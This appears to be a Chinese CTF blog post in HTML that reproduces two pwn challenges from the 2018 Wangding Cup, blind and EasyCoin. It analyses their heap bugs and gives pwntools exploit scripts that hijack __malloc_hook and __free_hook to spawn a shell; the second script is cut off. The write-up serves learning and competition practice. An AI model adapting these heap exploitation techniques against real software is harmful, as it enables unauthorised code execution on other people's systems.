@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="P4nda" />
+
+
+
+<meta name="description" content="没有参加网鼎杯的比赛，在家放假咸鱼了两周，回来复现了几道题，本篇记录blind、EasyCoin两题。">
+<meta name="keywords" content="PWN,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯CTF部分PWN题复现">
+<meta property="og:url" content="http://p4nda.top/2018/08/27/WDBCTF-2018/index.html">
+<meta property="og:site_name" content="p4nda&#39;s blog">
+<meta property="og:description" content="没有参加网鼎杯的比赛，在家放假咸鱼了两周，回来复现了几道题，本篇记录blind、EasyCoin两题。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/1-1.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/1-2.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/1-3.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/1-4.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/1-5.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/1-6.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/1-7.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-0.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-0-1.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-1.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-2.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-3.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-4.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-5.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-6.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-7.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-8.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-9.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-10.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-11.png">
+<meta property="og:image" content="http://p4nda.top/img/wdb2018/2-12.png">
+<meta property="og:updated_time" content="2018-08-27T14:37:47.925Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网鼎杯CTF部分PWN题复现">
+<meta name="twitter:description" content="没有参加网鼎杯的比赛，在家放假咸鱼了两周，回来复现了几道题，本篇记录blind、EasyCoin两题。">
+<meta name="twitter:image" content="http://p4nda.top/img/wdb2018/1-1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="p4nda&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/p4nda.jpeg">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>网鼎杯CTF部分PWN题复现 | p4nda&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?11859a78d84a58f3a5bac3d2ec5ea89e";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/p4nda.jpeg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">P4nda</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:root@p4nda.xyz" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/ret2p4nda" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
+                            
+                                <a class="fa 博客园" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
+                            
+                                <a class="fa QQ" href="/381124487" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Questions/">Questions</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://0gur1.cc">0gur1</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://tacxingxing.com">Tac1t0rnX</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://veritas501.space/">Veritas501</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://p1umer.club/">p1umer</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="//p4nda.top/WooyunDrops/">Wooyun知识库</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">PWNer of Dubhe | PWN &amp; security | byr</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">P4nda</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/p4nda.jpeg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">P4nda</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:root@p4nda.xyz" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/ret2p4nda" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
+                            
+                                <a class="fa 博客园" target="_blank" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/381124487" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-WDBCTF-2018" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/27/WDBCTF-2018/" class="article-date">
+      <time datetime="2018-08-27T08:05:49.000Z" itemprop="datePublished">2018-08-27</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      网鼎杯CTF部分PWN题复现
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><a href="https://pan.baidu.com/s/1QTwFBy5sbEcSLAadj7jRNg" target="_blank" rel="noopener">题目链接</a>  <strong><em>密码: 4qbr</em></strong> </p>
+<h1 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h1><p>首先是blind题目，感觉我的做法和网上放的WP有点不一样，看网上放的EXP都是通过劫持.bss段上的STDOUT指针然后通过printf函数触发，学习了一波。</p>
+<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>题目中给出3个功能，new、change、release。</p>
+<p>new：可以申请6个堆块，堆块大小固定为0x68（实际分配0x70）大小的堆块，而在向堆块读入时会在读入数据后加\x00。</p>
+<p><img src="/img/wdb2018/1-1.png" alt=""></p>
+<p>change: 没有什么特别的操作，只是单纯的根据bss段上的指针数组找到相应的堆块，然后限制写入大小为0x68.</p>
+<p><img src="/img/wdb2018/1-2.png" alt=""></p>
+<p>release：可以看到限制了release的次数，而这个变量在bss段上，并且在free以后没有对指针数组置零，形成悬垂指针，从而具有UAF、Double Free漏洞。</p>
+<p><img src="/img/wdb2018/1-3.png" alt=""></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此题利用的难点在于这个程序没有泄露的功能和位置。</p>
+<p>程序开启了除PIE的全部保护。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/p4nda/Desktop/pwn/other/blind/blind&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>利用想法首先是利用Double Free和UAF了，由于程序操作的堆块大小都是0x70的，所以很直观的想法就是劫持0x70这个fastbin链，而对于0x70这个数值很敏感，由于libc内存地址是0x7fxxxxxx，因此可以通过错位构造，将__malloc_hook-0x23这个块被分配，但由于没有libc地址泄露，此方法不可行。然而，在bss段上还有另外的0x7fxxx，就是STDIN、STDOUT、STDERR，</p>
+<p><img src="/img/wdb2018/1-4.png" alt=""></p>
+<p>而如果查看x/5gx 0x602045-8作为堆块，就会发现这个堆块大小为0x7f，当在fastbin链上的话，是可以分配的。</p>
+<p><img src="/img/wdb2018/1-5.png" alt=""></p>
+<p>而这时，我们就可以对bss段进行写入，造成任意地址写了。但是由于got表不可以改，因此泄露成为一个问题。我想到的思路是让libc地址恰好出现在bss段上ptr[]数组内，这样就可以对libc地址进行任意写了。</p>
+<p>又想到，当free时，是不会检查free的大小和位置的，只要任意构造符合要求的堆块大小就可以使其被释放到bin中，而在unsorted bin中的堆块，fd和bk会指向main_arena+88，这样就可以写libc了。</p>
+<p>因此通过在bss段上构造一个地址为ptr-0x10，大小为0x100的内存块，然后将其free，就可以使ptr[0],ptr[1]指向main_arena+88了。</p>
+<p><img src="/img/wdb2018/1-6.png" alt=""></p>
+<p>可以看到，堆块构造如上图，构造过程中必须保证0x100大小块的下一块标志位为1，并且构造下两块的标志位也为1，否则无法过free的检查。</p>
+<p>在free掉该块以后，发现伪造的堆块进入unsorted bin。</p>
+<p><img src="/img/wdb2018/1-7.png" alt=""></p>
+<p>当再次编辑时就可以修改bss段了，但是在这时发现一个特点，在这个版本的libc中将main<em>arena+88的最低位改成\x00，恰好变成\</em>_malloc_hook-0x10。因此找到一个新的想法，题目所用的编辑函数中会在输入的末位写\x00，可以将ptr[4]，指向ptr[0]，在编辑时，可以将ptr[0]写成__malloc_hook-0x10，这样再次编辑ptr[0]就可以将__malloc_hook改成题目中给的system(“/bin/sh”)函数，从而拿到shell了。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf=ELF(<span class="string">'./blind'</span>)</span><br><span class="line">ct  = string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./blind'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'106.75.20.44'</span>,  <span class="number">9999</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line">	p.recvuntil(<span class="string">"Done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line">	p.recvuntil(<span class="string">"Done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>,p64(<span class="number">0x602045</span><span class="number">-8</span>)+<span class="string">'\n'</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">new(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(<span class="number">0x101</span>)*<span class="number">2</span>+p64(<span class="number">0x602060</span>)+p64(<span class="number">0x602060</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x602140</span>)*<span class="number">3</span>+<span class="string">'\n'</span>)</span><br><span class="line">change(<span class="number">4</span>,p64(<span class="number">0x21</span>)*<span class="number">12</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">change(<span class="number">2</span>,<span class="string">'\n'</span>)</span><br><span class="line">change(<span class="number">0</span>,p64(<span class="number">0x4008E3</span>)*<span class="number">3</span>+<span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">3</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="EasyCoin"><a href="#EasyCoin" class="headerlink" title="EasyCoin"></a>EasyCoin</h1><p>这题是AAA战队的ZUHXS师傅发给我的，也是遇上了一个神奇问题，在给我发的i64文件中switch语句没显示default，我也是懒没看汇编，就漏掉了格式化字符串漏洞 www</p>
+<p><img src="/img/wdb2018/2-0.png" alt=""> <img src="/img/wdb2018/2-0-1.png" alt=""></p>
+<p>言归正传，这题最开始并没有什么想法，只是发现了功能实现上存在问题，可以给用户自身发送coin，然后delete时会存在一个不可控的free。最后根据别人的EXP调出来的，膜做出此题的师傅…</p>
+<h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2><p>题目的功能比较多，首先是注册和登录，注册功能中有这样一个结构体：</p>
+<p><img src="/img/wdb2018/2-1.png" alt=""></p>
+<p>其中username、password和结构体本身都是malloc(0x20)得到的0x30的内存块，coin_list这个指针最开始是置空的，后续操作中会用到。</p>
+<p>在登录以后程序会维护一个结构体指针，根据这个指针指向的s_user结构体进行操作,共有display_user、send_coin、display_transaction、change_passwd、delete_user、logout操作。</p>
+<p>在send_coin中出现了新的结构体s_coin</p>
+<p><img src="/img/wdb2018/2-2.png" alt=""></p>
+<p>这个结构体是一个单链表，每一笔交易发生时，会分别向发送者和接受者新建并插入这个结构体，用id来标识交易，in_out标识是收到还是支出。同样的这个s_coin结构体也是也0x30大小的块。</p>
+<p>在change_passwd函数中，会向结构体中指向的passwd指针写入数据。</p>
+<p>最终delete_user中，会首先释放username、passwd指针，然后变量coin_list的所有coin，并从其他用户的coin_list中移除相应的s_coin并释放。</p>
+<p><img src="/img/wdb2018/2-3.png" alt=""></p>
+<p><img src="/img/wdb2018/2-4.png" alt=""></p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在整个程序中，只找到了用户可以向自己发送coin，而在delete时会触发一个释放位置地址的漏洞。</p>
+<p>而程序在输入指令时，可以触发一个格式化字符串漏洞，通过格式化字符串漏洞可以泄露libc、堆地址。</p>
+<p>此题的难点在于如何利用程序逻辑来对堆块进行UAF。</p>
+<p>首先在释放的用户存在一个正常块时，释放后，由于不会对用户的coin_list进行操作，导致该链会指向fastbin链中的已释放部分。若正常逻辑也不会受到影响，但在这个coin_list上存在对自身转账的块时，就会在fastbin上寻找coin去释放，仅需利用fastbin上的脏数据即可释放一个正在用的块。</p>
+<p>如图是释放了username、password的fastbin结构</p>
+<p><img src="/img/wdb2018/2-5.png" alt=""></p>
+<p>如图是释放了一对正常交易块的堆结构</p>
+<p><img src="/img/wdb2018/2-6.png" alt=""></p>
+<p>此时，可以看到该用户s_user指向的coin_list已经与fastbin有交集</p>
+<p><img src="/img/wdb2018/2-7.png" alt=""></p>
+<p>而可以看到此处是预留的脏数据，可以使其指向user2-&gt;password块</p>
+<p><img src="/img/wdb2018/2-8.png" alt=""></p>
+<p>而这个块中的id位置被预置为与当前查找的id相同，当运行到这里就可以使得user2-&gt;password被释放。</p>
+<p><img src="/img/wdb2018/2-9.png" alt=""></p>
+<p>当delete运行结束后，可以看到fastbin链上存在一个可修改的块</p>
+<p><img src="/img/wdb2018/2-10.png" alt=""></p>
+<p>而通过user2的change_passwd功能可以修改这个fastbin块的fd指针，如将其修改到user2本身的控制块结构体</p>
+<p>此时被劫持的fastbin结构如下</p>
+<p><img src="/img/wdb2018/2-11.png" alt=""></p>
+<p>看到这样的堆结构，可以通过新建一个用户，在设置用户密码时可以覆写user2的控制块，将其password成员指向__free_hook。</p>
+<p><img src="/img/wdb2018/2-12.png" alt=""></p>
+<p>此时，由于password的只指向内容为\x00，因此使用\n就可登录，登录后修改密码为system地址。在delete时，</p>
+<p>由于username是”/bin/sh”，就相当于调用了system(“/bin/sh”);</p>
+<p>至此拿到了shell</p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf=ELF(<span class="string">'./EasyCoin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./EasyCoin'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x401474'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'106.75.20.44'</span>,  <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(username)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(username)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_user</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span 